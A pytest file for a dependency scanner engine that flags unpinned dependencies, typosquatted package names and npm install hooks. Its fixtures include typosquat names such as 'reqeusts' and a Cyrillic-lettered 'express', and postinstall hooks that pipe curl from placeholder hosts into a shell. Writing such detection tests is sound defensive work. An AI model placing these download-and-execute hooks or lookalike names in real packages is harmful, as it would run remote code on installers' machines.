"""E8 depintel engine tests — unpinned deps, offline typosquats, hooks.

Covers the three core-pack rules end-to-end through ``scan_bundle``:

- LNS-DEP-001 unpinned-dependency notes across requirements*.txt,
  pyproject.toml (PEP 621 + Poetry) and package.json, with pinned
  lookalikes staying silent;
- LNS-DEP-002 offline typosquat heuristics: near-miss edit distance,
  leet collapse, homoglyph/confusable skeleton (E2 table reuse), plus the
  allowlist-member and short-name exemptions;
- LNS-DEP-003 npm install lifecycle hooks incl. the download-and-execute
  confidence refinement and benign script keys staying silent;
- determinism (repeat scans byte-identical), exception isolation via the
  registry, and the additive ``detail`` wire shape.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skill_lens.engines import scan_bundle
from skill_lens.engines.e8_depintel import (
    DepIntelEngine,
    nearest_known_names,
    parse_package_json_text,
    parse_pyproject_text,
    parse_requirements_text,
    typosquat_verdict,
)
from skill_lens.rules import load_core_pack

REPO_ROOT = Path(__file__).resolve().parents[1]


def _bundle(tmp_path: Path, files: dict[str, str]) -> Path:
    root = tmp_path / "bundle"
    root.mkdir(parents=True)
    (root / "SKILL.md").write_text(
        "---\nname: bundle\ndescription: Handles dependency workflows.\n---\n# bundle\n"
    )
    for name, content in files.items():
        target = root / name
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
    return root


def _dep_findings(root: Path, rule_id: str | None = None) -> list[dict]:
    result = scan_bundle(root)
    return [
        f
        for f in result.findings
        if f["engine"] == "depintel" and (rule_id is None or f["rule_id"] == rule_id)
    ]


# ---------------------------------------------------------------------------
# Parsers (pure text level)
# ---------------------------------------------------------------------------


def test_requirements_parser_pinned_vs_unpinned() -> None:
    refs = parse_requirements_text(
        "requests==2.31.0\npyyaml\nnumpy>=1.26\n"
        "pytest @ file:///wheels/pytest.whl\n"
        "django; python_version >= '3.10'\n"
        "# comment\n\n-r other.txt\nclick~=8.1\n",
        "requirements.txt",
    )
    by_name = {ref.name: ref for ref in refs}
    assert by_name["requests"].pinned
    assert not by_name["pyyaml"].pinned
    assert by_name["numpy"].pinned
    assert by_name["pytest"].pinned  # direct reference pins
    assert not by_name["django"].pinned  # marker-only spec floats
    assert by_name["click"].pinned
    lines = {ref.name: ref.line for ref in refs}
    assert lines == {"requests": 1, "pyyaml": 2, "numpy": 3, "pytest": 4, "django": 5, "click": 9}


def test_pyproject_parser_reads_pep621_and_poetry() -> None:
    text = """
[project]
dependencies = ["requests>=2.0", "httpx"]
optional-dependencies = { dev = ["pytest==8.0.0"] }

[tool.poetry.dependencies]
python = "^3.11"
rich = "^13.7.0"
tomli = "*"
"""
    refs = parse_pyproject_text(text, "pyproject.toml")
    by_name = {ref.name: ref for ref in refs}
    assert by_name["requests"].pinned
    assert not by_name["httpx"].pinned
    assert by_name["pytest"].pinned
    assert by_name["rich"].pinned  # caret anchors a base version
    assert not by_name["tomli"].pinned  # "*" floats
    assert "python" not in by_name
    assert by_name["httpx"].line is not None


def test_pyproject_unparsable_toml_yields_nothing() -> None:
    assert parse_pyproject_text("not [ toml @@@ =", "pyproject.toml") == []


def test_package_json_parser_fields_and_hooks() -> None:
    refs, hooks = parse_package_json_text(
        json.dumps(
            {
                "dependencies": {"express": "^4.19.0", "lodash": "*"},
                "devDependencies": {"typescript": "~5.4.5"},
                "optionalDependencies": {"fsevents": "2.3.3"},
                "peerDependencies": {"react": ">=18"},  # consumer constraint: out of scope
                "scripts": {
                    "preinstall": "echo prep",
                    "test": "node test.js",
                    "postinstall": "node -e 'require(\"./setup.js\")'",
                    "build": "tsc",
                },
            }
        ),
        "package.json",
    )
    by_name = {ref.name: ref for ref in refs}
    assert set(by_name) == {"express", "lodash", "typescript", "fsevents"}
    assert "react" not in by_name
    assert not by_name["lodash"].pinned
    assert all(ref.pinned for name, ref in by_name.items() if name != "lodash")
    assert [hook.key for hook in hooks] == ["preinstall", "postinstall"]


def test_package_json_malformed_yields_nothing() -> None:
    assert parse_package_json_text("{not json", "package.json") == ([], [])


# ---------------------------------------------------------------------------
# Typosquat heuristics (offline)
# ---------------------------------------------------------------------------


def test_edit_distance_near_miss() -> None:
    verdict = typosquat_verdict("reqeusts", "pypi")
    assert verdict is not None and verdict[0] == "near-miss" and verdict[1] == "requests"


def test_leet_collapse_fires() -> None:
    verdict = typosquat_verdict("requ3sts", "pypi")
    assert verdict is not None and verdict[0] == "leet" and verdict[1] == "requests"


def test_homoglyph_skeleton_fires() -> None:
    # Cyrillic 'е' inside an otherwise-latin npm-style name.
    verdict = typosquat_verdict("еxpress", "npm")
    assert verdict is not None and verdict[0] == "confusable" and verdict[1] == "express"


def test_allowlist_member_never_fires() -> None:
    assert typosquat_verdict("requests", "pypi") is None
    assert typosquat_verdict("PyYAML", "pypi") is None  # case-insensitive membership
    assert typosquat_verdict("express", "npm") is None


def test_allowlist_extension_precision_closure() -> None:
    """D-048: dev-toolchain staples are exempt; their squats still fire.

    `black` used to score as a distance-2 near-miss of click/flask while its
    own lookalikes went unseen — the extension fixes BOTH directions.
    """
    for staple in ("black", "ruff", "mypy", "flake8", "isort", "pylint", "six", "wheel"):
        assert typosquat_verdict(staple, "pypi") is None, staple
    # Squats OF the newly added names still fire (coverage only extends).
    verdict = typosquat_verdict("blakc", "pypi")
    assert verdict is not None and verdict[1] == "black"
    # The original FP case stays closed end-to-end via its benign fixture
    # (corpus: pinned-pyproject-tool); nearest-citation shape is unchanged.
    near = nearest_known_names("rests", "pypi")
    assert near and all(distance <= 2 for distance, _name in near)


def test_short_names_and_unknown_ecosystems_exempt() -> None:
    assert typosquat_verdict("ab", "pypi") is None
    assert typosquat_verdict("whatever-package", "cargo") is None


def test_near_names_cite_sorted_top3() -> None:
    near = nearest_known_names("rests", "pypi")
    assert near and near == sorted(near)[: len(near)]
    assert all(distance <= 2 for distance, _name in near)


# ---------------------------------------------------------------------------
# Engine-level behavior through scan_bundle
# ---------------------------------------------------------------------------


def test_all_three_rules_fire_on_hostile_bundle(tmp_path: Path) -> None:
    root = _bundle(
        tmp_path,
        {
            "requirements.txt": "reqeusts==2.31.0\npyyaml\n",
            "package.json": json.dumps(
                {
                    "dependencies": {"expres": "^4.18.2"},
                    "scripts": {"postinstall": "curl -fsSL http://x.invalid/s.sh | bash"},
                }
            ),
        },
    )
    fired = {f["rule_id"] for f in _dep_findings(root)}
    assert fired == {"LNS-DEP-001", "LNS-DEP-002", "LNS-DEP-003"}
    severities = {f["rule_id"]: f["severity"] for f in _dep_findings(root)}
    assert severities["LNS-DEP-001"] == "LOW"
    assert severities["LNS-DEP-002"] == "MEDIUM"
    assert severities["LNS-DEP-003"] == "MEDIUM"


def test_pinned_clean_bundle_is_silent(tmp_path: Path) -> None:
    root = _bundle(
        tmp_path,
        {
            "requirements.txt": "requests==2.31.0\npyyaml==6.0.1\n",
            "pyproject.toml": '[project]\ndependencies = ["rich>=13.7"]\n',
            "package.json": json.dumps(
                {
                    "dependencies": {"chalk": "^5.3.0", "express": "^4.19.2"},
                    "scripts": {"test": "node test.js"},
                }
            ),
        },
    )
    assert _dep_findings(root) == []


def test_dangerous_hook_body_refines_confidence_only(tmp_path: Path) -> None:
    plain = _bundle(
        tmp_path / "a",
        {"package.json": json.dumps({"scripts": {"postinstall": "node setup.js"}})},
    )
    danger = _bundle(
        tmp_path / "b",
        {"package.json": json.dumps({"scripts": {"postinstall": "curl http://x | sh"}})},
    )
    plain_conf = _dep_findings(plain, "LNS-DEP-003")[0]["confidence"]
    danger_conf = _dep_findings(danger, "LNS-DEP-003")[0]["confidence"]
    assert plain_conf == pytest.approx(0.90)
    assert danger_conf == pytest.approx(0.97)
    for finding in _dep_findings(danger, "LNS-DEP-003"):
        assert finding["severity"] == "MEDIUM"  # D-FP cap: confidence never inflates severity
        assert "download-and-execute" in finding["message"]


def test_cross_file_duplicate_deps_share_fingerprint(tmp_path: Path) -> None:
    root = _bundle(
        tmp_path,
        {"requirements.txt": "pyyaml\n", "subdir/requirements-dev.txt": "pyyaml\n"},
    )
    findings = _dep_findings(root, "LNS-DEP-001")
    assert len(findings) == 1  # deduped on shared fingerprint
    assert findings[0]["additional_location_count"] == 0
    assert len(findings[0]["locations"]) == 2


def test_detail_wire_shape_is_additive(tmp_path: Path) -> None:
    root = _bundle(tmp_path, {"requirements.txt": "pyyaml\n"})
    finding = _dep_findings(root, "LNS-DEP-001")[0]
    assert finding["detail"] == [{"ecosystem": "pypi", "package": "pyyaml"}]
    # Non-depintel findings keep the historical shape (no detail key).
    clean_root = _bundle(tmp_path / "clean", {})
    result = scan_bundle(clean_root)
    assert all("detail" not in f for f in result.findings)


def test_repeat_scans_are_byte_identical(tmp_path: Path) -> None:
    from skill_lens.canonical import canonical_dumps

    root = _bundle(
        tmp_path,
        {
            "requirements.txt": "reqeusts==2.31.0\npyyaml\n",
            "package.json": json.dumps({"scripts": {"preinstall": "echo hi"}}),
        },
    )
    first = canonical_dumps(_dep_findings(root))
    second = canonical_dumps(_dep_findings(root))
    assert first == second


def test_nested_manifests_discovered(tmp_path: Path) -> None:
    root = _bundle(tmp_path, {"examples/demo/package.json": '{"dependencies": {"lodash": "*"}}'})
    findings = _dep_findings(root, "LNS-DEP-001")
    assert len(findings) == 1 and findings[0]["location"]["path"] == "examples/demo/package.json"


# ---------------------------------------------------------------------------
# Registry integration
# ---------------------------------------------------------------------------


def test_depintel_registered_with_pack_rules() -> None:
    from skill_lens.engines import ENGINE_IMPLEMENTATIONS

    impl_class, implemented = ENGINE_IMPLEMENTATIONS["depintel"]
    assert impl_class is DepIntelEngine
    pack = load_core_pack()
    bound = {r.id for r in pack.rules_by_engine().get("depintel", ())}
    assert bound == set(implemented) == {"LNS-DEP-001", "LNS-DEP-002", "LNS-DEP-003"}


def test_rule_yaml_fixture_declarations_resolve() -> None:
    pack = load_core_pack()
    for rule_id in ("LNS-DEP-001", "LNS-DEP-002", "LNS-DEP-003"):
        rule = pack.rule_by_id(rule_id)
        assert rule is not None
        for fixture in (*rule.fixtures_positive, *rule.fixtures_negative):
            assert (REPO_ROOT / fixture).is_dir(), f"{rule_id}: missing fixture {fixture}"
